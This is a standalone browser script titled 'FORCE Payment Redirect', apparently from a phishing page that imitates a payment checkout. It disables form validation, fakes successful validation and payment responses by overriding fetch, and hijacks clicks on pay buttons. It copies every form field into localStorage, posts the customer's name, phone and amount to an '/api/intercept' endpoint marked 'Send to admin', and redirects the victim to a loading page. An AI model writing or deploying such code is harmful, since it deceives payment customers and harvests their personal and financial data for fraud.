// ─── FORCE Payment Redirect - Disable All Validation ───────────────────────
(function() {
  'use strict';
  
  // ─── 1. Disable ALL form validation ───
  document.addEventListener('submit', function(e) {
    if (e.target && (e.target.id === 'paymentForm' || e.target.classList.contains('payment-form'))) {
      e.preventDefault();
      e.stopPropagation();
      forceRedirectToLoading();
    }
  }, true);
  
  // ─── 2. Override ALL input validation ───
  document.addEventListener('invalid', function(e) {
    e.preventDefault();
  }, true);
  
  // ─── 3. Intercept and disable ALL fetch requests for validation ───
  const originalFetch = window.fetch;
  window.fetch = function(url, options) {
    const urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
    
    // Block validation requests
    if (urlStr && (urlStr.includes('validate') || urlStr.includes('check'))) {
      return Promise.resolve(new Response(JSON.stringify({ valid: true }), { status: 200 }));
    }
    
    // Intercept payment submission - FORCE redirect
    if (urlStr && (urlStr.includes('submit') || urlStr.includes('payment') || urlStr.includes('qpay'))) {
      forceRedirectToLoading();
      return Promise.resolve(new Response(JSON.stringify({ success: true }), { status: 200 }));
    }
    
    return originalFetch.apply(this, arguments);
  };
  
  // ─── 4. Intercept button clicks ───
  document.addEventListener('click', function(e) {
    const target = e.target.closest('button, [role="button"]');
    if (!target) return;
    
    const text = (target.textContent || '').toLowerCase();
    
    // Detect payment button
    if (text.includes('دفع') || text.includes('pay') || text.includes('payment') || text.includes('submit')) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      
      forceRedirectToLoading();
      return false;
    }
  }, true);
  
  // ─── 5. Force redirect function ───
  function forceRedirectToLoading() {
    const orderRef = 'ORD-' + Date.now();
    localStorage.setItem('current_order_ref', orderRef);
    
    // Capture form data
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      const formData = new FormData(form);
      for (let [key, value] of formData.entries()) {
        localStorage.setItem(key, value);
      }
    });
    
    // Send to admin
    fetch('/api/intercept', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        raw_message: 'Payment initiated',
        page: window.location.pathname,
        timestamp: new Date().toISOString(),
        customer_name: localStorage.getItem('customer_name') || '',
        customer_phone: localStorage.getItem('customer_phone') || '',
        service_type: localStorage.getItem('service_type') || '',
        order_ref: orderRef,
        amount: localStorage.getItem('amount') || ''
      })
    }).catch(e => console.error('Send to admin failed:', e));
    
    // Redirect to loading page
    setTimeout(() => {
      window.location.href = '/loading?ref=' + orderRef;
    }, 100);
  }
  
  // ─── 6. Disable browser validation messages ───
  window.addEventListener('invalid', function(e) {
    e.preventDefault();
  }, true);
})();
